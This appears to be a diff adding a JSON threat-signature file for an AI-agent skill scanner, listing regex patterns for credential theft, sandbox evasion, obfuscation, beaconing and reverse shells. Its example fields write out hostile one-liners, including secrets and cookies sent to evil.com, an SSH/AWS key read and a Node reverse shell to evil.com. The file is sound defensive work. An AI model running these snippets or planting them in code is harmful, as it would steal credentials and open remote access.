@@ -1,0 +1,288 @@
+{
+  "metadata": {
+    "version": "1.0.0",
+    "created": "2026-02-15",
+    "source": "OSV, Snyk, agent security research",
+    "description": "Threat signatures for AgentGuard skill scanner"
+  },
+  "signatures": [
+    {
+      "id": "SIG-001",
+      "name": "Credential Exfiltration",
+      "severity": "CRITICAL",
+      "category": "DATA_THEFT",
+      "patterns": [
+        "process\.env\.[A-Z_]+.*https?://",
+        "fetch\(.*process\.env",
+        "axios\.(post|get)\(.*process\.env",
+        "http\.request\(.*process\.env",
+        "\.env\.[A-Z_]+.*\.send\(",
+        "post.*env\.[A-Z_]+"
+      ],
+      "description": "Sending environment variables/secrets to external servers",
+      "mitre_technique": "T1552",
+      "example": "fetch('https://evil.com', {body: process.env.API_KEY})"
+    },
+    {
+      "id": "SIG-002",
+      "name": "File System Escape",
+      "severity": "HIGH",
+      "category": "PRIVILEGE_ESCALATION",
+      "patterns": [
+        "fs\.(readFile|readFileSync)\(['\"]\\/.*\\.env",
+        "fs\.(readFile|readFileSync)\(['\"]\\.\\.\\/",
+        "\\.\\.\\/\\.\\.\\/",
+        "fs\.read.*\\\\.env$",
+        "readFile.*\\\\.\\\\."
+      ],
+      "description": "Attempting to read files outside allowed directory (../../../, /etc/passwd, etc.)",
+      "mitre_technique": "T1083",
+      "example": "fs.readFileSync('../../../.env')"
+    },
+    {
+      "id": "SIG-003",
+      "name": "Sandbox Evasion",
+      "severity": "HIGH",
+      "category": "DEFENSE_EVASION",
+      "patterns": [
+        "process\.argv.*includes.*docker",
+        "require\('os'\)\.hostname\(\).*includes",
+        "process\.env\.CI",
+        "process\.env\.GITHUB_ACTIONS",
+        "child_process.*vmstat",
+        "/proc/self",
+        "process\.env\..*SANDBOX",
+        "navigator\.webdriver"
+      ],
+      "description": "Detecting if running in sandbox/container and altering behavior",
+      "mitre_technique": "T1497",
+      "example": "if (process.env.CI) { return; } // Skip malicious code in CI"
+    },
+    {
+      "id": "SIG-004",
+      "name": "Infostealer - System Info",
+      "severity": "CRITICAL",
+      "category": "COLLECTION",
+      "patterns": [
+        "os\.userInfo\(\)",
+        "os\.hostname\(\)",
+        "os\.homedir\(\)",
+        "process\.cwd\(\)",
+        "require\('os'\).*networkInterfaces",
+        "cpuUsage",
+        "process\.memoryUsage"
+      ],
+      "description": "Collecting system information for exfiltration",
+      "mitre_technique": "T1082",
+      "example": "const info = { user: os.userInfo(), host: os.hostname() }"
+    },
+    {
+      "id": "SIG-005",
+      "name": "Dynamic Code Execution",
+      "severity": "CRITICAL",
+      "category": "EXECUTION",
+      "patterns": [
+        "eval\(",
+        "Function\(",
+        "setTimeout\(.*\\+",
+        "setInterval\(.*\\+",
+        "child_process\.exec\(",
+        "child_process\.spawn\(",
+        "execSync\(",
+        "require\('child_process'\)"
+      ],
+      "description": "Executing dynamically constructed code or system commands",
+      "mitre_technique": "T1059",
+      "example": "eval(Buffer.from('bWFs...', 'base64').toString())"
+    },
+    {
+      "id": "SIG-006",
+      "name": "Obfuscated Payload",
+      "severity": "HIGH",
+      "category": "DEFENSE_EVASION",
+      "patterns": [
+        "Buffer\.from\(.*base64",
+        "atob\(",
+        "btoa\(",
+        "\\\\x[0-9a-f]{2}",
+        "\\\\u[0-9a-f]{4}",
+        "\\\\[0-9]{1,3}",
+        "fromCharCode",
+        "unescape\("
+      ],
+      "description": "Using encoding/obfuscation to hide malicious code",
+      "mitre_technique": "T1027",
+      "example": "eval(Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString())"
+    },
+    {
+      "id": "SIG-007",
+      "name": "Network Beaconing",
+      "severity": "HIGH",
+      "category": "COMMAND_AND_CONTROL",
+      "patterns": [
+        "setInterval\(.*http",
+        "setTimeout\(.*http",
+        "cron.*https?://",
+        "schedule.*fetch",
+        "every.*request"
+      ],
+      "description": "Periodic communication with external server for C2",
+      "mitre_technique": "T1071",
+      "example": "setInterval(() => fetch('https://c2.com/beacon'), 30000)"
+    },
+    {
+      "id": "SIG-008",
+      "name": "Dependency Confusion",
+      "severity": "MEDIUM",
+      "category": "SUPPLY_CHAIN",
+      "patterns": [
+        "require\(['\"]internal-",
+        "require\(['\"]@company/",
+        "import.*from ['\"]@[a-z]+-"
+      ],
+      "description": "Typosquatting or dependency confusion attack patterns",
+      "mitre_technique": "T1195",
+      "example": "require('internal-api-client') // Not the official package"
+    },
+    {
+      "id": "SIG-009",
+      "name": "Clipboard Access",
+      "severity": "MEDIUM",
+      "category": "COLLECTION",
+      "patterns": [
+        "clipboardy",
+        "clipboard-",
+        "exec.*pbpaste",
+        "exec.*xclip",
+        "navigator\.clipboard"
+      ],
+      "description": "Accessing system clipboard for credential harvesting",
+      "mitre_technique": "T1115",
+      "example": "const clipboard = require('clipboardy'); clipboard.readSync()"
+    },
+    {
+      "id": "SIG-010",
+      "name": "Keylogger Behavior",
+      "severity": "CRITICAL",
+      "category": "COLLECTION",
+      "patterns": [
+        "keyboard",
+        "keypress",
+        "keyup",
+        "keydown",
+        "input.*event",
+        "stdin.*on.*data",
+        "readline.*createInterface"
+      ],
+      "description": "Capturing keyboard input for credential theft",
+      "mitre_technique": "T1056",
+      "example": "process.stdin.on('data', (key) => { sendToServer(key) })"
+    },
+    {
+      "id": "SIG-011",
+      "name": "Browser Session Hijacking",
+      "severity": "HIGH",
+      "category": "CREDENTIAL_ACCESS",
+      "patterns": [
+        "localStorage",
+        "sessionStorage",
+        "document\.cookie",
+        "chrome.*extension",
+        "browser.*cookies"
+      ],
+      "description": "Accessing browser storage for session tokens",
+      "mitre_technique": "T1539",
+      "example": "const cookies = document.cookie; fetch('https://evil.com/c=' + cookies)"
+    },
+    {
+      "id": "SIG-012",
+      "name": "SSH Key Theft",
+      "severity": "CRITICAL",
+      "category": "CREDENTIAL_ACCESS",
+      "patterns": [
+        "ssh/.*id_rsa",
+        "ssh/.*id_ed25519",
+        "\\.ssh/.*key",
+        "authorized_keys"
+      ],
+      "description": "Attempting to access SSH private keys",
+      "mitre_technique": "T1552.004",
+      "example": "fs.readFileSync(os.homedir() + '/.ssh/id_rsa')"
+    },
+    {
+      "id": "SIG-013",
+      "name": "AWS Credential Theft",
+      "severity": "CRITICAL",
+      "category": "CREDENTIAL_ACCESS",
+      "patterns": [
+        "aws/credentials",
+        "AWS_ACCESS_KEY",
+        "AWS_SECRET_KEY",
+        "aws.*secret.*access",
+        "\\.aws"
+      ],
+      "description": "Targeting AWS credentials in ~/.aws/ or environment",
+      "mitre_technique": "T1552",
+      "example": "fs.readFileSync(os.homedir() + '/.aws/credentials')"
+    },
+    {
+      "id": "SIG-014",
+      "name": "Git Credential Access",
+      "severity": "HIGH",
+      "category": "CREDENTIAL_ACCESS",
+      "patterns": [
+        "git/credentials",
+        "gitconfig",
+        "GITHUB_TOKEN",
+        "GITLAB_TOKEN",
+        "ghp_[a-zA-Z0-9]{36}"
+      ],
+      "description": "Accessing git credentials and tokens",
+      "mitre_technique": "T1552",
+      "example": "fs.readFileSync(os.homedir() + '/.git-credentials')"
+    },
+    {
+      "id": "SIG-015",
+      "name": "Reverse Shell",
+      "severity": "CRITICAL",
+      "category": "COMMAND_AND_CONTROL",
+      "patterns": [
+        "net\.Socket\(\)",
+        "socket\.connect\(.*\\d{2,5}",
+        "nc -e",
+        "ncat",
+        "bash -i",
+        "sh -i",
+        "cmd\.exe",
+        "powershell.*-enc"
+      ],
+      "description": "Establishing reverse shell connection",
+      "mitre_technique": "T1059.004",
+      "example": "require('net').Socket().connect(1337, 'evil.com').pipe(process.stdin)"
+    }
+  ],
+  "severity_weights": {
+    "CRITICAL": 100,
+    "HIGH": 50,
+    "MEDIUM": 20,
+    "LOW": 5
+  },
+  "scan_config": {
+    "max_file_size_mb": 5,
+    "exclude_patterns": [
+      "node_modules/",
+      "\.git/",
+      "test/",
+      "spec/",
+      "*.test.js",
+      "*.spec.js"
+    ],
+    "supported_extensions": [
+      ".js",
+      ".ts",
+      ".py",
+      ".json",
+      ".md"
+    ]
+  }
+}
